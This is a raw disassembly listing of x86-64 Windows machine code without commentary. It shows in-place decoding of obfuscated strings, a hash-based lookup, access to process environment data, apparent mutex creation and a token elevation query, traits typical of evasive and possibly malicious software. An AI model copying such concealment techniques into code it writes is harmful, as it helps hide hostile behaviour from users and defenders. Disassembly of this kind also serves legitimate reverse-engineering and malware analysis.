   140003bf1:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140003bf6:	eb 13                	jmp    0x140003c0b
   140003bf8:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003bfd:	31 d2                	xor    %edx,%edx
   140003bff:	e8 c2 d9 ff ff       	call   0x1400015c6
   140003c04:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140003c0b:	48 81 c4 48 05 00 00 	add    $0x548,%rsp
   140003c12:	5b                   	pop    %rbx
   140003c13:	5d                   	pop    %rbp
   140003c14:	5f                   	pop    %rdi
   140003c15:	5e                   	pop    %rsi
   140003c16:	41 5c                	pop    %r12
   140003c18:	41 5d                	pop    %r13
   140003c1a:	41 5e                	pop    %r14
   140003c1c:	41 5f                	pop    %r15
   140003c1e:	c3                   	ret
   140003c1f:	cc                   	int3
   140003c20:	55                   	push   %rbp
   140003c21:	41 57                	push   %r15
   140003c23:	41 56                	push   %r14
   140003c25:	41 55                	push   %r13
   140003c27:	41 54                	push   %r12
   140003c29:	56                   	push   %rsi
   140003c2a:	57                   	push   %rdi
   140003c2b:	53                   	push   %rbx
   140003c2c:	b8 e8 17 00 00       	mov    $0x17e8,%eax
   140003c31:	e8 2a ea ff ff       	call   0x140002660
   140003c36:	48 29 c4             	sub    %rax,%rsp
   140003c39:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140003c40:	00 
   140003c41:	0f 29 b5 50 17 00 00 	movaps %xmm6,0x1750(%rbp)
   140003c48:	e8 73 da ff ff       	call   0x1400016c0
   140003c4d:	80 3d 2d c6 2b 00 00 	cmpb   $0x0,0x2bc62d(%rip)        # 0x1402c0281
   140003c54:	0f 84 22 37 00 00    	je     0x14000737c
   140003c5a:	80 3d c5 c7 2b 00 00 	cmpb   $0x0,0x2bc7c5(%rip)        # 0x1402c0426
   140003c61:	0f 84 c9 00 00 00    	je     0x140003d30
   140003c67:	66 0f 6f 05 a1 79 00 	movdqa 0x79a1(%rip),%xmm0        # 0x14000b610
   140003c6e:	00 
   140003c6f:	66 0f 6f 0d 59 c7 2b 	movdqa 0x2bc759(%rip),%xmm1        # 0x1402c03d0
   140003c76:	00 
   140003c77:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140003c7b:	66 0f 6f 15 9d 79 00 	movdqa 0x799d(%rip),%xmm2        # 0x14000b620
   140003c82:	00 
   140003c83:	66 0f db ca          	pand   %xmm2,%xmm1
   140003c87:	66 0f 7f 0d 41 c7 2b 	movdqa %xmm1,0x2bc741(%rip)        # 0x1402c03d0
   140003c8e:	00 
   140003c8f:	66 0f 6f 0d 49 c7 2b 	movdqa 0x2bc749(%rip),%xmm1        # 0x1402c03e0
   140003c96:	00 
   140003c97:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140003c9b:	66 0f db ca          	pand   %xmm2,%xmm1
   140003c9f:	66 0f 7f 0d 39 c7 2b 	movdqa %xmm1,0x2bc739(%rip)        # 0x1402c03e0
   140003ca6:	00 
   140003ca7:	66 0f 6f 0d 41 c7 2b 	movdqa 0x2bc741(%rip),%xmm1        # 0x1402c03f0
   140003cae:	00 
   140003caf:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140003cb3:	66 0f db ca          	pand   %xmm2,%xmm1
   140003cb7:	66 0f 7f 0d 31 c7 2b 	movdqa %xmm1,0x2bc731(%rip)        # 0x1402c03f0
   140003cbe:	00 
   140003cbf:	66 0f 6f 0d 39 c7 2b 	movdqa 0x2bc739(%rip),%xmm1        # 0x1402c0400
   140003cc6:	00 
   140003cc7:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140003ccb:	66 0f db ca          	pand   %xmm2,%xmm1
   140003ccf:	66 0f 7f 0d 29 c7 2b 	movdqa %xmm1,0x2bc729(%rip)        # 0x1402c0400
   140003cd6:	00 
   140003cd7:	66 0f fd 05 31 c7 2b 	paddw  0x2bc731(%rip),%xmm0        # 0x1402c0410
   140003cde:	00 
   140003cdf:	66 0f db c2          	pand   %xmm2,%xmm0
   140003ce3:	66 0f 7f 05 25 c7 2b 	movdqa %xmm0,0x2bc725(%rip)        # 0x1402c0410
   140003cea:	00 
   140003ceb:	b8 cd 00 00 00       	mov    $0xcd,%eax
   140003cf0:	8b 0d 2a c7 2b 00    	mov    0x2bc72a(%rip),%ecx        # 0x1402c0420
   140003cf6:	01 c1                	add    %eax,%ecx
   140003cf8:	0f b6 c9             	movzbl %cl,%ecx
   140003cfb:	66 89 0d 1e c7 2b 00 	mov    %cx,0x2bc71e(%rip)        # 0x1402c0420
   140003d02:	0f b7 0d 19 c7 2b 00 	movzwl 0x2bc719(%rip),%ecx        # 0x1402c0422
   140003d09:	81 c1 cd 00 00 00    	add    $0xcd,%ecx
   140003d0f:	0f b6 c9             	movzbl %cl,%ecx
   140003d12:	66 89 0d 09 c7 2b 00 	mov    %cx,0x2bc709(%rip)        # 0x1402c0422
   140003d19:	03 05 05 c7 2b 00    	add    0x2bc705(%rip),%eax        # 0x1402c0424
   140003d1f:	0f b6 c0             	movzbl %al,%eax
   140003d22:	66 89 05 fb c6 2b 00 	mov    %ax,0x2bc6fb(%rip)        # 0x1402c0424
   140003d29:	c6 05 f6 c6 2b 00 00 	movb   $0x0,0x2bc6f6(%rip)        # 0x1402c0426
   140003d30:	48 c7 85 c0 16 00 00 	movq   $0x0,0x16c0(%rbp)
   140003d37:	00 00 00 00 
   140003d3b:	48 8d 35 8e c6 2b 00 	lea    0x2bc68e(%rip),%rsi        # 0x1402c03d0
   140003d42:	48 89 f1             	mov    %rsi,%rcx
   140003d45:	e8 b6 68 00 00       	call   0x14000a600
   140003d4a:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003d51:	01 c0                	add    %eax,%eax
   140003d53:	66 89 8d c2 16 00 00 	mov    %cx,0x16c2(%rbp)
   140003d5a:	66 89 85 c0 16 00 00 	mov    %ax,0x16c0(%rbp)
   140003d61:	48 89 b5 c8 16 00 00 	mov    %rsi,0x16c8(%rbp)
   140003d68:	c7 85 90 16 00 00 30 	movl   $0x30,0x1690(%rbp)
   140003d6f:	00 00 00 
   140003d72:	48 c7 85 98 16 00 00 	movq   $0x0,0x1698(%rbp)
   140003d79:	00 00 00 00 
   140003d7d:	c7 85 a8 16 00 00 00 	movl   $0x0,0x16a8(%rbp)
   140003d84:	00 00 00 
   140003d87:	48 8d 85 c0 16 00 00 	lea    0x16c0(%rbp),%rax
   140003d8e:	48 89 85 a0 16 00 00 	mov    %rax,0x16a0(%rbp)
   140003d95:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140003d99:	f3 0f 7f 85 b0 16 00 	movdqu %xmm0,0x16b0(%rbp)
   140003da0:	00 
   140003da1:	48 8d 8d 88 16 00 00 	lea    0x1688(%rbp),%rcx
   140003da8:	4c 8d 85 90 16 00 00 	lea    0x1690(%rbp),%r8
   140003daf:	ba 01 00 1f 00       	mov    $0x1f0001,%edx
   140003db4:	41 b1 01             	mov    $0x1,%r9b
   140003db7:	e8 83 d7 ff ff       	call   0x14000153f
   140003dbc:	85 c0                	test   %eax,%eax
   140003dbe:	0f 88 9b 35 00 00    	js     0x14000735f
   140003dc4:	48 c7 85 60 12 00 00 	movq   $0x0,0x1260(%rbp)
   140003dcb:	00 00 00 00 
   140003dcf:	4c 8d 85 60 12 00 00 	lea    0x1260(%rbp),%r8
   140003dd6:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003ddd:	ba 08 00 00 00       	mov    $0x8,%edx
   140003de2:	e8 1c d7 ff ff       	call   0x140001503
   140003de7:	c7 85 50 10 00 00 00 	movl   $0x0,0x1050(%rbp)
   140003dee:	00 00 00 
   140003df1:	48 8b 8d 60 12 00 00 	mov    0x1260(%rbp),%rcx
   140003df8:	48 85 c9             	test   %rcx,%rcx
   140003dfb:	74 40                	je     0x140003e3d
   140003dfd:	48 8d 85 50 10 00 00 	lea    0x1050(%rbp),%rax
   140003e04:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003e09:	4c 8d 85 30 0c 00 00 	lea    0xc30(%rbp),%r8
   140003e10:	ba 14 00 00 00       	mov    $0x14,%edx
   140003e15:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003e1b:	e8 4c d7 ff ff       	call   0x14000156c
   140003e20:	85 c0                	test   %eax,%eax
   140003e22:	78 19                	js     0x140003e3d
   140003e24:	48 8b 8d 60 12 00 00 	mov    0x1260(%rbp),%rcx
   140003e2b:	e8 2e d6 ff ff       	call   0x14000145e
   140003e30:	83 bd 30 0c 00 00 00 	cmpl   $0x0,0xc30(%rbp)
   140003e37:	41 0f 95 c5          	setne  %r13b
   140003e3b:	eb 03                	jmp    0x140003e40
   140003e3d:	45 31 ed             	xor    %r13d,%r13d
   140003e40:	b9 8c 43 a0 19       	mov    $0x19a0438c,%ecx
   140003e45:	e8 76 62 00 00       	call   0x14000a0c0
   140003e4a:	89 c0                	mov    %eax,%eax
   140003e4c:	65 48 8b 18          	mov    %gs:(%rax),%rbx
   140003e50:	48 8b 43 20          	mov    0x20(%rbx),%rax
   140003e54:	48 8b b0 80 00 00 00 	mov    0x80(%rax),%rsi
   140003e5b:	48 8d bd 30 0c 00 00 	lea    0xc30(%rbp),%rdi
   140003e62:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140003e68:	48 89 f9             	mov    %rdi,%rcx
   140003e6b:	31 d2                	xor    %edx,%edx
   140003e6d:	e8 6e 68 00 00       	call   0x14000a6e0
   140003e72:	48 8b 43 20          	mov    0x20(%rbx),%rax
   140003e76:	48 8b 50 68          	mov    0x68(%rax),%rdx
   140003e7a:	48 89 f9             	mov    %rdi,%rcx
   140003e7d:	e8 5e 67 00 00       	call   0x14000a5e0
   140003e82:	48 8d 8d 50 10 00 00 	lea    0x1050(%rbp),%rcx
   140003e89:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140003e8f:	31 d2                	xor    %edx,%edx
   140003e91:	e8 4a 68 00 00       	call   0x14000a6e0
   140003e96:	80 3d e5 c3 2b 00 00 	cmpb   $0x0,0x2bc3e5(%rip)        # 0x1402c0282
   140003e9d:	0f 84 5e 35 00 00    	je     0x140007401
   140003ea3:	80 3d 9e c5 2b 00 00 	cmpb   $0x0,0x2bc59e(%rip)        # 0x1402c0448
   140003eaa:	74 47                	je     0x140003ef3
   140003eac:	66 0f 6f 05 7c c5 2b 	movdqa 0x2bc57c(%rip),%xmm0        # 0x1402c0430
   140003eb3:	00 
   140003eb4:	66 0f fd 05 84 77 00 	paddw  0x7784(%rip),%xmm0        # 0x14000b640
   140003ebb:	00 
   140003ebc:	66 0f db 05 5c 77 00 	pand   0x775c(%rip),%xmm0        # 0x14000b620
   140003ec3:	00 
   140003ec4:	66 0f 7f 05 64 c5 2b 	movdqa %xmm0,0x2bc564(%rip)        # 0x1402c0430
   140003ecb:	00 
   140003ecc:	f3 0f 7e 05 6c c5 2b 	movq   0x2bc56c(%rip),%xmm0        # 0x1402c0440
   140003ed3:	00 
   140003ed4:	66 0f fd 05 74 77 00 	paddw  0x7774(%rip),%xmm0        # 0x14000b650
   140003edb:	00 
   140003edc:	66 0f db 05 7c 77 00 	pand   0x777c(%rip),%xmm0        # 0x14000b660
   140003ee3:	00 
   140003ee4:	66 0f d6 05 54 c5 2b 	movq   %xmm0,0x2bc554(%rip)        # 0x1402c0440
   140003eeb:	00 
   140003eec:	c6 05 55 c5 2b 00 00 	movb   $0x0,0x2bc555(%rip)        # 0x1402c0448
   140003ef3:	48 8d 0d 36 c5 2b 00 	lea    0x2bc536(%rip),%rcx        # 0x1402c0430
   140003efa:	e8 01 67 00 00       	call   0x14000a600
   140003eff:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   140003f03:	74 49                	je     0x140003f4e
   140003f05:	49 89 c6             	mov    %rax,%r14
   140003f08:	4c 8d 3d 21 c5 2b 00 	lea    0x2bc521(%rip),%r15        # 0x1402c0430
   140003f0f:	31 db                	xor    %ebx,%ebx
   140003f11:	49 89 f4             	mov    %rsi,%r12
   140003f14:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003f1b:	00 00 00 00 00 
   140003f20:	4c 89 e1             	mov    %r12,%rcx
   140003f23:	4c 89 fa             	mov    %r15,%rdx
   140003f26:	4d 89 f0             	mov    %r14,%r8
   140003f29:	e8 62 67 00 00       	call   0x14000a690
   140003f2e:	85 c0                	test   %eax,%eax
   140003f30:	0f 84 a6 03 00 00    	je     0x1400042dc
   140003f36:	4c 89 e1             	mov    %r12,%rcx
   140003f39:	e8 c2 66 00 00       	call   0x14000a600
   140003f3e:	66 41 83 7c 44 02 00 	cmpw   $0x0,0x2(%r12,%rax,2)
   140003f45:	4d 8d 64 44 02       	lea    0x2(%r12,%rax,2),%r12
   140003f4a:	75 d4                	jne    0x140003f20
   140003f4c:	eb 02                	jmp    0x140003f50
   140003f4e:	31 db                	xor    %ebx,%ebx
   140003f50:	80 3d 2c c3 2b 00 00 	cmpb   $0x0,0x2bc32c(%rip)        # 0x1402c0283
   140003f57:	0f 84 90 03 00 00    	je     0x1400042ed
   140003f5d:	80 3d 00 c5 2b 00 00 	cmpb   $0x0,0x2bc500(%rip)        # 0x1402c0464
   140003f64:	74 47                	je     0x140003fad
   140003f66:	66 0f 6f 05 e2 c4 2b 	movdqa 0x2bc4e2(%rip),%xmm0        # 0x1402c0450
   140003f6d:	00 
   140003f6e:	66 0f fd 05 ca 76 00 	paddw  0x76ca(%rip),%xmm0        # 0x14000b640
   140003f75:	00 
   140003f76:	66 0f db 05 a2 76 00 	pand   0x76a2(%rip),%xmm0        # 0x14000b620
   140003f7d:	00 
   140003f7e:	66 0f 7f 05 ca c4 2b 	movdqa %xmm0,0x2bc4ca(%rip)        # 0x1402c0450
   140003f85:	00 
   140003f86:	66 0f 6f 05 d2 c4 2b 	movdqa 0x2bc4d2(%rip),%xmm0        # 0x1402c0460
   140003f8d:	00 
   140003f8e:	66 0f fd 05 ea 76 00 	paddw  0x76ea(%rip),%xmm0        # 0x14000b680
   140003f95:	00 
   140003f96:	66 0f db 05 f2 76 00 	pand   0x76f2(%rip),%xmm0        # 0x14000b690
   140003f9d:	00 
   140003f9e:	66 0f 7e 05 ba c4 2b 	movd   %xmm0,0x2bc4ba(%rip)        # 0x1402c0460
   140003fa5:	00 
   140003fa6:	c6 05 b7 c4 2b 00 00 	movb   $0x0,0x2bc4b7(%rip)        # 0x1402c0464
   140003fad:	4c 8d b5 50 10 00 00 	lea    0x1050(%rbp),%r14
   140003fb4:	4c 89 f1             	mov    %r14,%rcx
   140003fb7:	48 89 da             	mov    %rbx,%rdx
   140003fba:	e8 31 66 00 00       	call   0x14000a5f0
   140003fbf:	48 8d 15 8a c4 2b 00 	lea    0x2bc48a(%rip),%rdx        # 0x1402c0450
   140003fc6:	4c 89 f1             	mov    %r14,%rcx
   140003fc9:	e8 12 66 00 00       	call   0x14000a5e0
   140003fce:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140003fd2:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140003fd8:	31 d2                	xor    %edx,%edx
   140003fda:	e8 01 67 00 00       	call   0x14000a6e0
   140003fdf:	80 3d 9e c2 2b 00 00 	cmpb   $0x0,0x2bc29e(%rip)        # 0x1402c0284
   140003fe6:	0f 84 62 34 00 00    	je     0x14000744e
   140003fec:	80 3d cb c4 2b 00 00 	cmpb   $0x0,0x2bc4cb(%rip)        # 0x1402c04be
   140003ff3:	0f 84 fb 00 00 00    	je     0x1400040f4
   140003ff9:	66 0f 6f 05 9f 76 00 	movdqa 0x769f(%rip),%xmm0        # 0x14000b6a0
   140004000:	00 
   140004001:	66 0f 6f 0d 67 c4 2b 	movdqa 0x2bc467(%rip),%xmm1        # 0x1402c0470
   140004008:	00 
   140004009:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000400d:	66 0f 6f 15 0b 76 00 	movdqa 0x760b(%rip),%xmm2        # 0x14000b620
   140004014:	00 
   140004015:	66 0f db ca          	pand   %xmm2,%xmm1
   140004019:	66 0f 7f 0d 4f c4 2b 	movdqa %xmm1,0x2bc44f(%rip)        # 0x1402c0470
   140004020:	00 
   140004021:	66 0f 6f 0d 57 c4 2b 	movdqa 0x2bc457(%rip),%xmm1        # 0x1402c0480
   140004028:	00 
   140004029:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000402d:	66 0f db ca          	pand   %xmm2,%xmm1
   140004031:	66 0f 7f 0d 47 c4 2b 	movdqa %xmm1,0x2bc447(%rip)        # 0x1402c0480
   140004038:	00 
   140004039:	66 0f 6f 0d 4f c4 2b 	movdqa 0x2bc44f(%rip),%xmm1        # 0x1402c0490
   140004040:	00 
   140004041:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004045:	66 0f db ca          	pand   %xmm2,%xmm1
   140004049:	66 0f 7f 0d 3f c4 2b 	movdqa %xmm1,0x2bc43f(%rip)        # 0x1402c0490
   140004050:	00 
   140004051:	66 0f fd 05 47 c4 2b 	paddw  0x2bc447(%rip),%xmm0        # 0x1402c04a0
   140004058:	00 
   140004059:	66 0f db c2          	pand   %xmm2,%xmm0
   14000405d:	66 0f 7f 05 3b c4 2b 	movdqa %xmm0,0x2bc43b(%rip)        # 0x1402c04a0
   140004064:	00 
   140004065:	8b 05 45 c4 2b 00    	mov    0x2bc445(%rip),%eax        # 0x1402c04b0
   14000406b:	83 c0 43             	add    $0x43,%eax
   14000406e:	0f b6 c0             	movzbl %al,%eax
   140004071:	66 89 05 38 c4 2b 00 	mov    %ax,0x2bc438(%rip)        # 0x1402c04b0
   140004078:	0f b7 05 33 c4 2b 00 	movzwl 0x2bc433(%rip),%eax        # 0x1402c04b2
   14000407f:	83 c0 43             	add    $0x43,%eax
   140004082:	0f b6 c0             	movzbl %al,%eax
   140004085:	66 89 05 26 c4 2b 00 	mov    %ax,0x2bc426(%rip)        # 0x1402c04b2
   14000408c:	8b 05 22 c4 2b 00    	mov    0x2bc422(%rip),%eax        # 0x1402c04b4
   140004092:	83 c0 43             	add    $0x43,%eax
   140004095:	0f b6 c0             	movzbl %al,%eax
   140004098:	66 89 05 15 c4 2b 00 	mov    %ax,0x2bc415(%rip)        # 0x1402c04b4
   14000409f:	0f b7 05 10 c4 2b 00 	movzwl 0x2bc410(%rip),%eax        # 0x1402c04b6
   1400040a6:	83 c0 43             	add    $0x43,%eax
   1400040a9:	0f b6 c0             	movzbl %al,%eax
   1400040ac:	66 89 05 03 c4 2b 00 	mov    %ax,0x2bc403(%rip)        # 0x1402c04b6
   1400040b3:	8b 05 ff c3 2b 00    	mov    0x2bc3ff(%rip),%eax        # 0x1402c04b8
   1400040b9:	83 c0 43             	add    $0x43,%eax
   1400040bc:	0f b6 c0             	movzbl %al,%eax
   1400040bf:	66 89 05 f2 c3 2b 00 	mov    %ax,0x2bc3f2(%rip)        # 0x1402c04b8
   1400040c6:	0f b7 05 ed c3 2b 00 	movzwl 0x2bc3ed(%rip),%eax        # 0x1402c04ba
   1400040cd:	83 c0 43             	add    $0x43,%eax
   1400040d0:	0f b6 c0             	movzbl %al,%eax
   1400040d3:	66 89 05 e0 c3 2b 00 	mov    %ax,0x2bc3e0(%rip)        # 0x1402c04ba
   1400040da:	8b 05 dc c3 2b 00    	mov    0x2bc3dc(%rip),%eax        # 0x1402c04bc
   1400040e0:	83 c0 43             	add    $0x43,%eax
   1400040e3:	0f b6 c0             	movzbl %al,%eax
   1400040e6:	66 89 05 cf c3 2b 00 	mov    %ax,0x2bc3cf(%rip)        # 0x1402c04bc
   1400040ed:	c6 05 ca c3 2b 00 00 	movb   $0x0,0x2bc3ca(%rip)        # 0x1402c04be
   1400040f4:	4c 8d 75 d0          	lea    -0x30(%rbp),%r14
   1400040f8:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   1400040ff:	4c 89 f1             	mov    %r14,%rcx
   140004102:	e8 e9 64 00 00       	call   0x14000a5f0
   140004107:	48 8d 15 62 c3 2b 00 	lea    0x2bc362(%rip),%rdx        # 0x1402c0470
   14000410e:	4c 89 f1             	mov    %r14,%rcx
   140004111:	e8 ca 64 00 00       	call   0x14000a5e0
   140004116:	45 84 ed             	test   %r13b,%r13b
   140004119:	0f 84 e2 00 00 00    	je     0x140004201
   14000411f:	48 8d 8d 20 0a 00 00 	lea    0xa20(%rbp),%rcx
   140004126:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   14000412c:	31 d2                	xor    %edx,%edx
   14000412e:	e8 ad 65 00 00       	call   0x14000a6e0
   140004133:	80 3d 4c c1 2b 00 00 	cmpb   $0x0,0x2bc14c(%rip)        # 0x1402c0286
   14000413a:	0f 84 82 33 00 00    	je     0x1400074c2
   140004140:	80 3d e3 c3 2b 00 00 	cmpb   $0x0,0x2bc3e3(%rip)        # 0x1402c052a
   140004147:	74 5c                	je     0x1400041a5
   140004149:	66 0f 6f 05 bf c3 2b 	movdqa 0x2bc3bf(%rip),%xmm0        # 0x1402c0510
   140004150:	00 
   140004151:	66 0f fd 05 77 75 00 	paddw  0x7577(%rip),%xmm0        # 0x14000b6d0
   140004158:	00 
   140004159:	66 0f db 05 bf 74 00 	pand   0x74bf(%rip),%xmm0        # 0x14000b620
   140004160:	00 
   140004161:	66 0f 7f 05 a7 c3 2b 	movdqa %xmm0,0x2bc3a7(%rip)        # 0x1402c0510
   140004168:	00 
   140004169:	f3 0f 7e 05 af c3 2b 	movq   0x2bc3af(%rip),%xmm0        # 0x1402c0520
   140004170:	00 
   140004171:	66 0f fd 05 67 75 00 	paddw  0x7567(%rip),%xmm0        # 0x14000b6e0
   140004178:	00 
   140004179:	66 0f db 05 df 74 00 	pand   0x74df(%rip),%xmm0        # 0x14000b660
   140004180:	00 
   140004181:	66 0f d6 05 97 c3 2b 	movq   %xmm0,0x2bc397(%rip)        # 0x1402c0520
   140004188:	00 
   140004189:	b8 c9 00 00 00       	mov    $0xc9,%eax
   14000418e:	03 05 94 c3 2b 00    	add    0x2bc394(%rip),%eax        # 0x1402c0528
   140004194:	0f b6 c0             	movzbl %al,%eax
   140004197:	66 89 05 8a c3 2b 00 	mov    %ax,0x2bc38a(%rip)        # 0x1402c0528
   14000419e:	c6 05 85 c3 2b 00 00 	movb   $0x0,0x2bc385(%rip)        # 0x1402c052a
   1400041a5:	48 8d 0d 64 c3 2b 00 	lea    0x2bc364(%rip),%rcx        # 0x1402c0510
   1400041ac:	e8 4f 64 00 00       	call   0x14000a600
   1400041b1:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   1400041b5:	0f 84 78 01 00 00    	je     0x140004333
   1400041bb:	48 89 c3             	mov    %rax,%rbx
   1400041be:	4c 8d 3d 4b c3 2b 00 	lea    0x2bc34b(%rip),%r15        # 0x1402c0510
   1400041c5:	31 ff                	xor    %edi,%edi
   1400041c7:	49 89 f4             	mov    %rsi,%r12
   1400041ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400041d0:	4c 89 e1             	mov    %r12,%rcx
   1400041d3:	4c 89 fa             	mov    %r15,%rdx
   1400041d6:	49 89 d8             	mov    %rbx,%r8
   1400041d9:	e8 b2 64 00 00       	call   0x14000a690
   1400041de:	85 c0                	test   %eax,%eax
   1400041e0:	0f 84 51 01 00 00    	je     0x140004337
   1400041e6:	4c 89 e1             	mov    %r12,%rcx
   1400041e9:	e8 12 64 00 00       	call   0x14000a600
   1400041ee:	66 41 83 7c 44 02 00 	cmpw   $0x0,0x2(%r12,%rax,2)
   1400041f5:	4d 8d 64 44 02       	lea    0x2(%r12,%rax,2),%r12
   1400041fa:	75 d4                	jne    0x1400041d0
   1400041fc:	e9 3a 01 00 00       	jmp    0x14000433b
   140004201:	80 3d 7d c0 2b 00 00 	cmpb   $0x0,0x2bc07d(%rip)        # 0x1402c0285
   140004208:	0f 84 0a 33 00 00    	je     0x140007518
   14000420e:	80 3d ef c2 2b 00 00 	cmpb   $0x0,0x2bc2ef(%rip)        # 0x1402c0504
   140004215:	0f 84 9a 00 00 00    	je     0x1400042b5
   14000421b:	66 0f 6f 05 8d 74 00 	movdqa 0x748d(%rip),%xmm0        # 0x14000b6b0
   140004222:	00 
   140004223:	66 0f 6f 0d 95 c2 2b 	movdqa 0x2bc295(%rip),%xmm1        # 0x1402c04c0
   14000422a:	00 
   14000422b:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000422f:	66 0f 6f 15 e9 73 00 	movdqa 0x73e9(%rip),%xmm2        # 0x14000b620
   140004236:	00 
   140004237:	66 0f db ca          	pand   %xmm2,%xmm1
   14000423b:	66 0f 7f 0d 7d c2 2b 	movdqa %xmm1,0x2bc27d(%rip)        # 0x1402c04c0
   140004242:	00 
   140004243:	66 0f 6f 0d 85 c2 2b 	movdqa 0x2bc285(%rip),%xmm1        # 0x1402c04d0
   14000424a:	00 
   14000424b:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000424f:	66 0f db ca          	pand   %xmm2,%xmm1
   140004253:	66 0f 7f 0d 75 c2 2b 	movdqa %xmm1,0x2bc275(%rip)        # 0x1402c04d0
   14000425a:	00 
   14000425b:	66 0f 6f 0d 7d c2 2b 	movdqa 0x2bc27d(%rip),%xmm1        # 0x1402c04e0
   140004262:	00 
   140004263:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004267:	66 0f db ca          	pand   %xmm2,%xmm1
   14000426b:	66 0f 7f 0d 6d c2 2b 	movdqa %xmm1,0x2bc26d(%rip)        # 0x1402c04e0
   140004272:	00 
   140004273:	66 0f fd 05 75 c2 2b 	paddw  0x2bc275(%rip),%xmm0        # 0x1402c04f0
   14000427a:	00 
   14000427b:	66 0f db c2          	pand   %xmm2,%xmm0
   14000427f:	66 0f 7f 05 69 c2 2b 	movdqa %xmm0,0x2bc269(%rip)        # 0x1402c04f0
   140004286:	00 
   140004287:	8b 05 73 c2 2b 00    	mov    0x2bc273(%rip),%eax        # 0x1402c0500
   14000428d:	83 c0 29             	add    $0x29,%eax
   140004290:	0f b6 c0             	movzbl %al,%eax
   140004293:	66 89 05 66 c2 2b 00 	mov    %ax,0x2bc266(%rip)        # 0x1402c0500
   14000429a:	0f b7 05 61 c2 2b 00 	movzwl 0x2bc261(%rip),%eax        # 0x1402c0502
   1400042a1:	83 c0 29             	add    $0x29,%eax
   1400042a4:	0f b6 c0             	movzbl %al,%eax
   1400042a7:	66 89 05 54 c2 2b 00 	mov    %ax,0x2bc254(%rip)        # 0x1402c0502
   1400042ae:	c6 05 4f c2 2b 00 00 	movb   $0x0,0x2bc24f(%rip)        # 0x1402c0504
   1400042b5:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400042ba:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400042bf:	4c 8d 0d fa c1 2b 00 	lea    0x2bc1fa(%rip),%r9        # 0x1402c04c0
   1400042c6:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   1400042cd:	31 c9                	xor    %ecx,%ecx
   1400042cf:	4d 89 f0             	mov    %r14,%r8
   1400042d2:	e8 19 eb ff ff       	call   0x140002df0
   1400042d7:	e9 83 30 00 00       	jmp    0x14000735f
   1400042dc:	4b 8d 1c 74          	lea    (%r12,%r14,2),%rbx
   1400042e0:	80 3d 9c bf 2b 00 00 	cmpb   $0x0,0x2bbf9c(%rip)        # 0x1402c0283
   1400042e7:	0f 85 70 fc ff ff    	jne    0x140003f5d
   1400042ed:	c6 05 70 c1 2b 00 01 	movb   $0x1,0x2bc170(%rip)        # 0x1402c0464
   1400042f4:	66 0f 6f 05 74 73 00 	movdqa 0x7374(%rip),%xmm0        # 0x14000b670
   1400042fb:	00 
   1400042fc:	66 0f 7f 05 4c c1 2b 	movdqa %xmm0,0x2bc14c(%rip)        # 0x1402c0450
   140004303:	00 
   140004304:	c7 05 52 c1 2b 00 71 	movl   $0x3f0071,0x2bc152(%rip)        # 0x1402c0460
   14000430b:	00 3f 00 
   14000430e:	48 8d 0d 0b 42 00 00 	lea    0x420b(%rip),%rcx        # 0x140008520
   140004315:	e8 56 d0 ff ff       	call   0x140001370
   14000431a:	c6 05 62 bf 2b 00 01 	movb   $0x1,0x2bbf62(%rip)        # 0x1402c0283
   140004321:	80 3d 3c c1 2b 00 00 	cmpb   $0x0,0x2bc13c(%rip)        # 0x1402c0464
   140004328:	0f 85 38 fc ff ff    	jne    0x140003f66
   14000432e:	e9 7a fc ff ff       	jmp    0x140003fad
   140004333:	31 ff                	xor    %edi,%edi
   140004335:	eb 04                	jmp    0x14000433b
   140004337:	49 8d 3c 5c          	lea    (%r12,%rbx,2),%rdi
   14000433b:	80 3d 45 bf 2b 00 00 	cmpb   $0x0,0x2bbf45(%rip)        # 0x1402c0287
   140004342:	0f 84 01 32 00 00    	je     0x140007549
   140004348:	80 3d 1f c2 2b 00 00 	cmpb   $0x0,0x2bc21f(%rip)        # 0x1402c056e
   14000434f:	0f 84 f1 00 00 00    	je     0x140004446
   140004355:	f3 0f 7e 15 d3 c1 2b 	movq   0x2bc1d3(%rip),%xmm2        # 0x1402c0530
   14000435c:	00 
   14000435d:	66 0f 6f 05 7b 73 00 	movdqa 0x737b(%rip),%xmm0        # 0x14000b6e0
   140004364:	00 
   140004365:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004369:	66 0f 6f 0d ef 72 00 	movdqa 0x72ef(%rip),%xmm1        # 0x14000b660
   140004370:	00 
   140004371:	66 0f db d1          	pand   %xmm1,%xmm2
   140004375:	f3 0f 7e 1d bb c1 2b 	movq   0x2bc1bb(%rip),%xmm3        # 0x1402c0538
   14000437c:	00 
   14000437d:	66 0f fd d8          	paddw  %xmm0,%xmm3
